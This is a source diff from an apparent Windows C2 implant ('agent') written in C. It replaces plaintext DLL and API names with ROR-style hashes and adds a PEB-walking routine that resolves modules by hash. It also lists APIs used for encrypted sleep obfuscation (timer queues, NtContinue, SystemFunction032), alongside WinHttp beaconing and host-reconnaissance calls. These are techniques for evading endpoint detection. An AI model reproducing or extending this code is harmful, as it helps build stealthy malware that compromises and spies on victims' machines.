@@ -34,42 +34,40 @@ UINT64 Rotr64HashW(const LPWSTR str) {
 ****Hashing Order****
 
 DllNameHashes = {
-"kernel32.dll": 0x70E973267B32EF52,
-"ntdll.dll" : 0xD99176CD993A6E6C,
-"user32.dll" : 0xD99173267CB2F456,
-"advapi32.dll" : 0x6C9973267A78625A,
-"winhttp.dll" : 0xB591770E9D346F40,
-"iphlpapi.dll" : 0x9CD9769E18786D3E,
+0xAF6973267322CEF1, //KERNEL32.DLL
+0xD99176CD993A6E6C, //ntdll.dll
 }
 ApiNameHashes = {
-"winhttpopen": 0xA7C37F0E9D346F42,
-"winhttpconnect" : 0x6B0E15CDF8F8755E,
-"winhttpopenrequest" : 0xA71EFDB6F4215456,
-"winhttpsendrequest" : 0xB71EFDB6F41C5D40,
-"winhttpsetoption" : 0xB34E34E878B2F450,
-"winhttpaddrequestheaders" : 0x63B35EF16C9C5613,
-"winhttpreceiveresponse" : 0x5889BCB31EE4FF7,
-"winhttpqueryheaders" : 0xBD2634B9EEABC71B,
-"winhttpreaddata" : 0xBCCE1389F979714B,
-"winhttpclosehandle" : 0x691AC4B750E3DE3F,
-"rtlgetversion" : 0x934EBF2CBDBA663E,
-"ntclose" : 0xE7BF663E9B800065,
-"ntopenprocesstoken" : 0x97366C0AB4E7C04E,
-"ntopenthreadtoken" : 0x9F25DD6892E0F340,
-"ntqueryinformationtoken" : 0x326517A990EEDACA,
-"rtlallocateheap" : 0x76A614FB1871F04A,
-"rtlreallocateheap" : 0x76A5A4B9D2E3F04A,
-"rtlrandomex" : 0x93B77E4DD8796D62,
-"ntgettickcount" : 0x7516CBFD78F4F55E,
-"getadaptersinfo" : 0x60CA9BF8197A7133,
-"getusernamea" : 0x62EF0EEE5979F64B,
-"getcomputernameexa" : 0xC91E0CD5361F344B,
-"localalloc" : 0xDFB3661D9871F03B,
-"localrealloc" : 0x9F13661CBCB6622B,
-"localfree" : 0xCBCB36CC38F7EC65,
-"getlocaltime" : 0x72DFA6CC38F7ED4F,
-"getsystemtimeasfiletime" : 0x1262FEB90D685C11,
-"getsystemmetrics" : 0x9776D5E62EF6E65D,
+0x27C27F0E9D246F42, //WinHttpOpen
+0xEB0E11CDF0F8755D, //WinHttpConnect
+0x271EFDAEEC211456, //WinHttpOpenRequest
+0x371EFDAEEC1C1D40, //WinHttpSendRequest
+0xB34C34E468B2D450, //WinHttpSetOption
+0x61B35AE1647C5613, //WinHttpAddRequestHeaders
+0x5849BC331DE4F77, //WinHttpReceiveResponse
+0xBC2634B9D6ABC69B, //WinHttpQueryHeaders
+0xBBCD1381F969714B, //WinHttpReadData
+0xE91AC4AB50E39E3E, //WinHttpCloseHandle
+0x934CBF2CB5BA65FE, //RtlGetVersion
+0xE7BF643E93800065, //NtClose
+0x96366A0AA4E7804E, //NtOpenProcessToken
+0x1F25DB6092C0F340, //NtOpenThreadToken
+0x30650DA980EEDACA, //NtQueryInformationToken
+0x75A514F31871F04A, //RtlAllocateHeap
+0x75A4A0B9D2C3F04A, //RtlReAllocateHeap
+0xD3B77E4DD8696D61, //RtlRandomEx
+0x7416C5FD78F4D55E, //NtGetTickCount
+0x5FC99BF0197A7133, //GetAdaptersInfo
+0x61EF0CEE5979D62B, //GetUserNameA
+0xC89E0CCD2E1EF42B, //GetComputerNameExA
+0xDFB3641D9871EFFB, //LocalAlloc
+0x9E13641CB4B6622B, //LocalReAlloc
+0xCBCA36CC38F7CC65, //LocalFree
+0xB22B0F2C5A666505, //LoadLibraryA
+0x2B3DEF2C9071F059, //GetProcAddress
+0x71DEA6CC38F7CD4F, //GetLocalTime
+0x1261F2B90D585BD0, //GetSystemTimeAsFileTime
+0x9774D5E616F6E65D, //GetSystemMetrics
 }
 */
 
@@ -117,8 +115,41 @@ LPVOID RetrieveFunctionPointerFromhash(HMODULE Module, UINT64 Hash) {
 	return NULL;
 }
 
-VOID RetrievePointerFromHash(UINT64 hash) {
-	//TODO implement this function to retrieve a pointer from a hash
+PVOID GetModuleBaseAddr(_In_ UINT64 Hash)
+{
+    P_INT_LDR_DATA_TABLE_ENTRY Ldr = NULL;
+    PLIST_ENTRY Hdr = NULL;
+    PLIST_ENTRY Ent = NULL;
+    P_INT_PEB Peb = NULL;
+
+    Peb = agent->pTeb->ProcessEnvironmentBlock;
+    Hdr = &Peb->Ldr->InMemoryOrderLinks;
+    Ent = Hdr->Flink;
+
+    // cycle through the doubly linked list until we reach the first link.
+    for (; Hdr != Ent; Ent = Ent->Flink)
+    {
+        Ldr = Ent;
+
+        if ((Rotr64HashW(Ldr->BaseDllName.Buffer) == Hash) || Hash == 0)
+            return Ldr->DllBase;
+
+    }
+
+    return NULL;
+
+}
+
+DWORD GetImageSize(_In_ PVOID ModuleBase)
+{
+	PIMAGE_DOS_HEADER DosHdr = NULL;
+	PIMAGE_NT_HEADERS NtHdr = NULL;
+
+	DosHdr = (PIMAGE_DOS_HEADER)ModuleBase;
+	NtHdr = (PIMAGE_NT_HEADERS)((LPBYTE)ModuleBase + DosHdr->e_lfanew);
+
+	return NtHdr->OptionalHeader.SizeOfImage;
+    
 }
 
 //TODO finish the putting the hashes into the agent using the config builder. maybe even put it in a custom section?
@@ -167,9 +198,27 @@ void printhashes() {
         "LocalReAlloc",
         "LocalFree",
         "LoadLibraryA",
+        "GetProcAddress",
         "GetLocalTime",
         "GetSystemTimeAsFileTime",
-        "GetSystemMetrics"
+        "GetSystemMetrics",
+        "RtlCreateTimerQueue",
+        "NtCreateEvent",
+        "RtlCaptureContext",
+        "RtlCreateTimer",
+        "RtlRegisterWait",
+        "RtlDeleteTimerQueue",
+        "RtlCopyMappedMemory",
+        "NtWaitForSingleObject",
+        "NtSignalAndWaitForSingleObject",
+        "NtContinue",
+        "NtSetEvent",
+        "NtSetContextThread",
+        "NtDuplicateObject",
+        "VirtualProtect",
+        "SystemFunction032",
+        "WaitForSingleObjectEx",
+        
     };
 	printf("ApiNameHashes = {\n");
 	for (int i = 0; i < sizeof(apiNames) / sizeof(apiNames[0]); i++) {
